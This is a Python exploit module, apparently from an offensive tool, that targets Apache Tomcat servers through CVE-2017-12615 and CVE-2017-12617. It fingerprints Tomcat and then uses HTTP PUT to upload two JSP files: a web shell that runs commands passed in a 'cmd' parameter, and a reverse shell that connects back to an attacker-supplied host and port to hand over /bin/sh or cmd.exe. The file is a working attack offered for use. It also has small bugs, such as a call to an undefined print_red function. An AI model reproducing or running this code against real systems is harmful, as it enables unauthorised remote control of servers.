import random
import string
import requests
from lib.headers.headers_handler import user_agents
from lib.color_handler import print_colour

headers = {
    'User-Agent': user_agents()
}

def generate_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def check_tomcat(ip, ports=False):
    tomcat_paths = [
        "",
        "/",
        f"/{generate_string()}",
        "/docs/introduction.html"
    ]

    protocols = ["http", "https"]

    if ports is None:
        ports = [80]
    else:
        ports = [f":{port}" for port in ports]

    for protocol in protocols:
        for port in ports:
            for path in tomcat_paths:
                url = f"{protocol}://{ip}{port}{path}"
                try:
                    response = requests.get(url, headers=headers, timeout=5, verify=False)
                    if any(
                        keyword in response.headers.get('Server', '').lower()
                        for keyword in ['tomcat']
                    ) or any(
                        keyword in response.text.lower()
                        for keyword in ['apache tomcat', '/manager/html', '/manager/status']
                    ):
                        print_colour(f"Tomcat detected at {url}")
                        return True
                except requests.RequestException:
                    continue
    return False

def upload_primary_payload(main_url):
    print_colour("Attempting primary JSP payload upload (webshell)")
    primary_jsp_payload = '''
    <%@ page import="java.util.*,java.io.*"%>
    <%
    if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String line;
        while ((line = dis.readLine()) != null) {
            out.println(line);
        }
    }
    %>
    '''

    upload_url = f"{main_url}/{generate_string()}.jsp"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    try:
        response = requests.put(upload_url, data=primary_jsp_payload, headers=headers, timeout=10, verify=False)
        if response.status_code == 201:
            print_colour(f"Primary JSP shell uploaded at {upload_url}")
            return upload_url
        else:
            print_colour(f"Failed to upload primary JSP shell (status code: {response.status_code})")
    except requests.RequestException:
        print_red(f"Error during primary JSP upload")
    return None

def upload_secondary_payload(main_url, lhost, lport):
    print_colour("Attempting secondary JSP payload upload (revshell)")
    secondary_jsp_payload = '''
    <%@ page import="java.util.*,java.io.*,java.net.*"%>
    <%
    class StreamConnector extends Thread {
        InputStream is;
        OutputStream os;
        StreamConnector(InputStream is, OutputStream os) {
            this.is = is;
            this.os = os;
        }
        public void run() {
            BufferedReader reader = null;
            BufferedWriter writer = null;
            try {
                reader = new BufferedReader(new InputStreamReader(this.is));
                writer = new BufferedWriter(new OutputStreamWriter(this.os));
                char[] buffer = new char[8192];
                int length;
                while ((length = reader.read(buffer, 0, buffer.length)) > 0) {
                    writer.write(buffer, 0, length);
                    writer.flush();
                }
            } catch (Exception e) {
                // Handle exception
            } finally {
                try {
                    if (reader != null) reader.close();
                    if (writer != null) writer.close();
                } catch (Exception e) {
                    // Handle exception
                }
            }
        }
    }

    try {
        String shell = "/bin/sh";
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            shell = "cmd.exe";
        }
        Socket socket = new Socket("{lhost}", {lport});
        Process process = Runtime.getRuntime().exec(shell);
        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();
        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();
    } catch (Exception e) {
        // Handle exception
    }
    %>
    '''.replace("{lhost}", lhost).replace("{lport}", str(lport))

    upload_url = f"{main_url}/{generate_string()}.jsp"
    try:
        response = requests.put(upload_url, data=secondary_jsp_payload, headers=headers, timeout=10, verify=False)
        if response.status_code == 201:
            print_colour(f"Secondary JSP shell uploaded at {upload_url}?cmd=")
            return upload_url
        else:
            print_colour(f"Failed to upload secondary JSP shell (status code: {response.status_code})")
    except requests.RequestException:
        print_colour(f"Error during secondary JSP upload")

    return None

def exploit_CVE_2017_12615_CVE_2017_12617(ip, lhost=None, lport=None, port=None):
    if check_tomcat(ip, [port]):
        print_colour("Attempting CVE-2017-12615 & CVE-2017-12617 exploitation (JSP upload)")
        main_url = f"http://{ip}:{port}" if port else f"http://{ip}"
        upload_primary_payload(main_url)
        if lhost and lport:
            upload_secondary_payload(main_url, lhost, lport)
        else:
            print_colour("Skipping secondary payload upload due to missing lhost or lport.")